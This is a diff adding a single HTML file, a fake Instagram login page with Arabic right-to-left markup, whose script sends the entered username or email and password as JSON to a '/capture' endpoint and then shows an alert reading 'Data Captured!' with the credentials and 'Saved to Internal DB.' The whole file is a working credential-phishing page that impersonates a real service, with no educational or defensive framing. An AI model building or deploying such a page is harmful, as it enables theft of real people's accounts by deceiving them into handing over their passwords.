@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <style>
+        body {
+            background-color: #000;
+            color: white;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-box {
+            background: #1a1a1a;
+            padding: 40px;
+            border-radius: 10px;
+            text-align: center;
+            width: 300px;
+        }
+        input {
+            width: 90%;
+            padding: 10px;
+            margin: 10px 0;
+            border: none;
+            border-bottom: 1px solid #555;
+            background: transparent;
+            color: white;
+        }
+        button {
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 100%;
+            font-weight: bold;
+        }
+        h2 { margin-bottom: 20px; }
+    </style>
+</head>
+<body>
+
+<div class="login-box">
+    <h2>Instagram</h2>
+    <form id="loginForm">
+        <input type="text" id="username" placeholder="Phone number, username, or email" required>
+        <input type="password" id="password" placeholder="Password" required>
+        <button type="submit">Log In</button>
+    </form>
+</div>
+
+<script>
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const email = document.getElementById('username').value;
+        const pass = document.getElementById('password').value;
+
+        // إرسال البيانات إلى السيرفر
+        fetch('/capture', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ email: email, pass: pass })
+        }).then(() => {
+            // عرض رسالة النجاح كما طلبت سابقاً
+            alert("🔒 Data Captured!\n\nEmail: " + email + "\nPass: " + pass + "\n\nSaved to Internal DB.");
+        });
+    });
+</script>
+
+</body>
+</html>
